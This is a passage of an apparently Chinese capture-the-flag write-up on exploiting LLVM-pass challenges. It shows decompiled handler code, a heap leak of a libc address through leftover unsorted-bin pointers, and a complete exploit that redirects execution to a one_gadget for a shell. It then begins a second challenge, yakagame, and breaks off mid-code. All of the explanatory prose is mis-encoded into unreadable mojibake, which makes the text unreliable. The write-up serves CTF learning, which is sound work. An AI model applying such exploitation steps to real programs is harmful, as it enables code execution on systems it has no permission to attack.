class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ‰§è¡Œ<code>*byte_2040f8</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³å¦‚æœå¯ä»¥ä¿®æ”¹<code>byte_2040f8</code>ä¸º<code>one_gadget</code>çš„åœ°å€ï¼Œæ‰§è¡Œè¯¥æ®µä»£ç æ—¶æˆ‘ä»¬å°±å¯ä»¥<code>getshell</code>äº†<br>äºæ˜¯å¯¹<code>byte_2040f8</code>è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œçœ‹çœ‹ä»€ä¹ˆåœ°æ–¹å¯ä»¥å¯¹è¯¥å€¼è¿›è¡Œä¿®æ”¹ï¼Œæ¥ä¸‹æ¥å¯¹èƒ½å¯¹è¯¥åœ°å€è¿›è¡Œä¿®æ”¹çš„éƒ¨åˆ†ä»£ç è¿›è¡Œè¯¦ç»†åˆ†æ<br>é¦–å…ˆæ˜¯å¯¹<code>fakekey</code>å‡½æ•°çš„å¤„ç†,å®šä½åˆ°å…³é”®éƒ¨åˆ†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°å¯ä»¥å¯¹<code>*byte_2040f8</code>å’Œ<code>byte_204100</code>çš„å€¼åŠ ä¸Šä¸€ä¸ªç”¨æˆ·è‡ªå·±å®šä¹‰çš„æ•°ï¼Œå³<code>*byte_2040f8 = byte_204100 + ç”¨æˆ·çš„value</code><br>æ¥ä¸‹æ¥åˆ†æ<code>stealkey</code>çš„å…³é”®éƒ¨åˆ†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå°†<code>*byte_2040f8</code>èµ‹å€¼ç»™<code>byte_204100</code><br>æœ€åæ˜¯å¯¹<code>save</code>éƒ¨åˆ†çš„åˆ†æï¼Œå…¶æœ‰ä¸‹é¢è¿™æ®µå…³é”®ä»£ç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œçš„ä»£ç æ„æ€æ˜¯è¦æ±‚<code>save</code>å‡½æ•°è¦æœ‰<code>2</code>ä¸ªå‚æ•°ï¼Œä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡º<code>byte_2040f8</code>æŒ‡å‘ä¸€ä¸ªæ–°ç”³è¯·çš„<code>0x20</code>å¤§å°çš„å †å—ï¼Œè€Œåé¢çš„æ“ä½œçœ‹çš„ä¹Ÿä¸æ˜¯å¤ªæ‡‚ï¼Œå› ä¸ºå‰é¢çœ‹çš„ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œäºæ˜¯ç”¨<code>gdb</code>è°ƒè¯•äº†ä¸€ä¸‹ï¼Œæµ‹è¯•è„šæœ¬ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>gdb</code>ä¸­æŸ¥çœ‹<code>byte_2040f8</code>ï¼š  </p><img src="/2024/03/15/llvm/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°<code>byte_2040f8</code>æŒ‡å‘ä¸€ä¸ªæ–°<code>malloc</code>çš„å †å—ï¼Œå †å—å¤§å°ä¸º<code>0x18</code>ï¼Œå †å—çš„å†…å®¹ä¸º<code>save</code>å‡½æ•°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå›åˆ°æœ€å¼€å§‹ç¨‹åºåˆšè¿›å…¥åˆ°å¯¹<code>save</code>å‡½æ•°çš„è¿›è¡Œå¤„ç†çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹çœ‹å †å—çš„å¸ƒå±€ï¼š  </p><img src="/2024/03/15/llvm/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°<code>unsortedbin</code>ä¸­å­˜åœ¨ä¸€ä¸ªå †å—ï¼Œ<code>tcache</code>ä¸­æœ‰<code>7</code>ä¸ª<code>0x20</code>å¤§å°çš„å †å—ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>7</code>ä¸ªå †å—ç”³è¯·å‡ºæ¥ï¼Œå†ç”¨<code>save</code>å‡½æ•°ç”³è¯·<code>0x20</code>å¤§å°çš„å †å—ï¼Œå †ç®¡ç†ç³»ç»Ÿåˆ™ä¼šç›´æ¥åˆ‡å‰²<code>unsortedbin</code>ä¸­çš„å †å—è¿›è¡Œåˆ†é…ï¼Œæ­¤æ—¶ç”³è¯·å‡ºæ¥çš„å †å—ä¼šæ®‹ç•™ç€ä¹‹å‰<code>unsortedbin</code>åœ¨<code>fd</code>ä¸Šæœ‰å…³<code>libc</code>çš„åœ°å€ï¼Œå³æˆ‘ä»¬å¯ä»¥ä»¤<code>*byte_2040f8</code>ä¸º<code>libc</code>ä¸Šçš„ä¸€ä¸ªåœ°å€<br>æ­¤æ—¶æˆ‘ä»¬å¯åˆ©ç”¨<code>stealkey</code>å‡½æ•°å°†<code>*byte_2040f8</code>ä¸Šçš„å€¼èµ‹å€¼ç»™<code>byte_204100</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/03/15/llvm/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å†åˆ©ç”¨<code>fakekey</code>å‡½æ•°<code>*byte_2040f8 = byte_204100 - one_gadgetä¸byte_204100ä¸Šæœ‰å…³libcåœ°å€çš„åç§»</code>ï¼Œå³å¯å¦<code>*byte_2040f8</code>çš„å€¼ä¸º<code>one_gadget</code>çš„åœ°å€ï¼Œæœ€åä½¿ç”¨<code>run</code>å‡½æ•°æ‰§è¡Œ<code>one_gadget</code>ç›´æ¥<code>getshell</code>ã€‚æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2022-yakagame"><a href="#å¼ºç½‘æ¯-2022-yakagame" class="headerlink" title="[å¼ºç½‘æ¯ 2022] yakagame"></a>[å¼ºç½‘æ¯ 2022] yakagame</h2><p>è¿™é“é¢˜çš„<code>PASS</code>æ³¨å†Œçš„åç§°å¹¶ä¸èƒ½ç›´æ¥åœ¨<code>start</code>å‡½æ•°ä¸­æ‰¾æ‰“ï¼Œçœ‹äº†<code>winmt</code>å¸ˆå‚…çš„æ–‡ç« å‘ç°å¯ä»¥å¯¹<code>__cxa_atexit</code>å‡½æ•°â€œäº¤å‰å¼•ç”¨â€æ¥å®šä½ï¼Œå¦‚ä¸‹å›¾ï¼š  </p><img src="/2024/03/15/llvm/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§<code>PASS</code>æ³¨å†Œçš„åç§°ä¸º<code>ayaka</code>ï¼ˆæ²¡äº‹å¹²ç»™<code>ida64</code>æ¢äº†ä¸€ä¸ªä¸»é¢˜å“ˆå“ˆå“ˆï¼‰ã€‚æ¥ä¸‹æ¥å¯¹ä¸»è¦å‡½æ•°è¿›è¡Œåˆ†æï¼Œç”¨ä¸Šé¢é¢˜ç›®çš„æ–¹æ³•å®šä½åˆ°<code>sub_C880</code>å³ä¸ºé‡å†™çš„<code>runOnFunction</code>å‡½æ•°ã€‚<br>è¿˜æ˜¯å’Œä¹‹å‰çš„æ–¹æ³•ä¸€æ ·ï¼Œå‘ç°ç¨‹åºä¸»è¦æ˜¯å¯¹<code>gamestart</code>å‡½æ•°çš„å®šä¹‰è¿›è¡Œåˆ†æå’Œæ“ä½œï¼Œæ¥ä¸‹æ¥è¯¦ç»†åˆ†æå„ä¸ªéƒ¨åˆ†<br>å¯¹<code>fight</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><img src="/2024/03/15/llvm/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¯¥å‡½æ•°åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œä»¥è¯¥å‚æ•°ä½œä¸ºç´¢å¼•ï¼Œä»<code>weaponlist</code>æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªæ•°<code>v53</code>ä¸<code>boss</code>è¿›è¡Œæ¯”è¾ƒï¼š  </p><ul><li>å¦‚æœ<code>v53</code>çš„å€¼å°äº<code>boss</code>ï¼Œåˆ™è¾“å‡º<code>loss</code>  </li><li>å¦‚æœ<code>v53</code>çš„å€¼å¤§äºç­‰äº<code>boss</code>ï¼Œåˆ™è¾“å‡º<code>win</code>ï¼Œå¹¶è¿›è¡Œèµ‹å€¼æ“ä½œï¼š<code>*score = v53 - boss</code>  </li><li>å¦‚æœ<code>*score &gt; 0x12345678</code>ï¼Œåˆ™ä¼šè¿›å…¥<code>backdoor</code>å‡½æ•°</li></ul><p>æ¥ä¸‹æ¥å°±çœ‹çœ‹è¿™ä¸ª<code>backdoor</code>å‡½æ•°ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>cmd</code>çš„å€¼å¹¶ä¸”æ‰§è¡Œ<code>backdoor</code>å‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿ<code>getshell</code><br>å¯¹<code>merge</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// å‚æ•°ä¸€</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// å‚æ•°äºŒ</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°éœ€è¦æœ‰<code>2</code>ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸º<code>v50</code>å’Œ<code>v49</code>ï¼Œæœ€åè¿›è¡Œ<code>weaponlist[v50] += weaponlist[v49]</code>æ“ä½œ<br>ä¸‹é¢å‡ ä¸ªå‡½æ•°æ¯”è¾ƒå®¹æ˜“çœ‹æ‡‚ä¸”ç”¨å¤„ä¸å¤§ï¼Œå°±ä¸åšåˆ†æ<br>å¯¹<code>destroy</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹<code>upgrade</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    